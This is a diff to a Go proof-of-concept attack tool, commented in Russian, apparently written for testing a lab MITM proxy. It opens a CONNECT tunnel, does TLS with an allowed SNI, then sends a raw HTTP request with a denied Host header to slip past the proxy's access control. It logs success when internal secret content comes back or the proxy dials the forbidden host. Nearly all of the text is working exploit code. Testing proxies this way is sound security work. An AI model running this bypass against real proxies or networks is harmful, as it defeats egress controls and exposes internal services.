@@ -35,7 +35,6 @@ func executeRun(o runOpts) int {
 	return 0
 }
 
-// runAttack выполняет control + bypass; true = атака удалась (уязвимость).
 func runAttack(o runOpts) (bool, error) {
 	pool, err := loadCAForMode(o.caFile, o.connectMode)
 	if err != nil {
@@ -47,12 +46,8 @@ func runAttack(o runOpts) (bool, error) {
 		runControlCheck(o.proxyAddr, o.internalURL, o.proxyUser, o.proxyPass)
 	}
 
-	log.Println("=== bypass: CONNECT allowed + HTTP на другой host ===")
-	succeeded, err := runBypassAttack(o.connectMode, o.proxyAddr, o.connectHost, o.tlsSNI, o.mode, o.internalURL, o.internalHost, pool, o.proxyUser, o.proxyPass)
-	if err != nil {
-		return false, err
-	}
-	return succeeded, nil
+	log.Printf("=== bypass: TLS SNI=%q (allow), HTTP Host=%q (deny) ===", o.tlsSNI, o.httpHost)
+	return runBypassSniOkHostBad(o.connectMode, o.proxyAddr, o.connectHost, o.tlsSNI, o.httpHost, o.httpPath, pool, o.proxyUser, o.proxyPass)
 }
 
 func runControlCheck(proxyAddr, internalURL, user, pass string) {
@@ -76,7 +71,7 @@ func loadCAForMode(path, connectMode string) (*x509.CertPool, error) {
 	return loadCA(path)
 }
 
-func runBypassAttack(connectMode, proxyAddr, connectDest, sni, mode, evilURL, evilHost string, pool *x509.CertPool, user, pass string) (bool, error) {
+func runBypassSniOkHostBad(connectMode, proxyAddr, connectDest, allowedSNI, evilHost, path string, pool *x509.CertPool, user, pass string) (bool, error) {
 	raw, br, err := dialCONNECT(proxyAddr, connectDest, user, pass)
 	if err != nil {
 		return false, fmt.Errorf("CONNECT %s: %w", connectDest, err)
@@ -84,7 +79,7 @@ func runBypassAttack(connectMode, proxyAddr, connectDest, sni, mode, evilURL, ev
 	defer raw.Close()
 
 	tlsCfg := &tls.Config{
-		ServerName: sni,
+		ServerName: allowedSNI,
 		MinVersion: tls.VersionTLS12,
 	}
 	if connectMode == "tunnel" {
@@ -101,15 +96,7 @@ func runBypassAttack(connectMode, proxyAddr, connectDest, sni, mode, evilURL, ev
 		return false, fmt.Errorf("TLS к MITM: %w", err)
 	}
 
-	var rawReq string
-	switch mode {
-	case "relative":
-		rawReq = fmt.Sprintf("GET /secret HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", evilHost)
-	case "absolute":
-		rawReq = fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", evilURL, hostFromURL(evilURL))
-	default:
-		return false, fmt.Errorf("unknown -mode %q", mode)
-	}
+	rawReq := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, evilHost)
 	if _, err := tlsConn.Write([]byte(rawReq)); err != nil {
 		return false, err
 	}
@@ -122,48 +109,27 @@ func runBypassAttack(connectMode, proxyAddr, connectDest, sni, mode, evilURL, ev
 	if snippet := setup.POCResponseSnippet(resp.status, resp.body); snippet != "" {
 		log.Printf("bypass: ответ: %s", snippet)
 	}
-	switch bypassVerdict(resp, evilURL, evilHost) {
-	case verdictConfirmedSecret:
-		log.Println("bypass: ПОДТВЕРЖДЕНО — тело от internal origin")
-		return true, nil
-	case verdictConfirmedDial:
-		log.Println("bypass: ПОДТВЕРЖДЕНО — ACL пропустил запрос, прокси сам подключился к internal host (502 = lab не слушает :9555)")
-		return true, nil
-	case verdictDenied:
-		log.Println("bypass: отказ ACL (403/forbidden)")
-	default:
-		log.Println("bypass: атака не подтверждена")
-	}
-	return false, nil
+	return reportBypassVerdict(resp, evilHost), nil
 }
 
-type bypassVerdictKind int
-
-const (
-	verdictUnknown bypassVerdictKind = iota
-	verdictConfirmedSecret
-	verdictConfirmedDial
-	verdictDenied
-)
-
-func bypassVerdict(resp httpResp, evilURL, evilHost string) bypassVerdictKind {
+func reportBypassVerdict(resp httpResp, evilHost string) bool {
 	body := resp.body
 	if strings.Contains(body, "SECRET_INTERNAL_HIT") {
-		return verdictConfirmedSecret
+		log.Println("bypass: ПОДТВЕРЖДЕНО — тело от internal origin")
+		return true
 	}
-	target := hostFromURL(evilURL)
-	if target == "" {
-		target = evilHost
-	}
-	if target != "" && strings.Contains(body, target) {
+	if evilHost != "" && strings.Contains(body, evilHost) {
 		if resp.status == 502 || strings.Contains(body, "dial tcp") || strings.Contains(body, "connectex") {
-			return verdictConfirmedDial
+			log.Println("bypass: ПОДТВЕРЖДЕНО — ACL пропустил, прокси подключился к запрещённому host")
+			return true
 		}
 	}
 	if resp.status == 403 || strings.Contains(body, "403 Forbidden") {
-		return verdictDenied
+		log.Println("bypass: отказ ACL (403/forbidden)")
+		return false
 	}
-	return verdictUnknown
+	log.Println("bypass: атака не подтверждена")
+	return false
 }
 
 type httpResp struct {
@@ -209,15 +175,6 @@ func readHTTPResponse(conn net.Conn) (httpResp, error) {
 		return httpResp{}, err
 	}
 	return httpResp{status: code, body: string(body)}, nil
-}
-
-func hostFromURL(u string) string {
-	u = strings.TrimPrefix(u, "https://")
-	u = strings.TrimPrefix(u, "http://")
-	if i := strings.Index(u, "/"); i >= 0 {
-		u = u[:i]
-	}
-	return u
 }
 
 func loadCA(path string) (*x509.CertPool, error) {
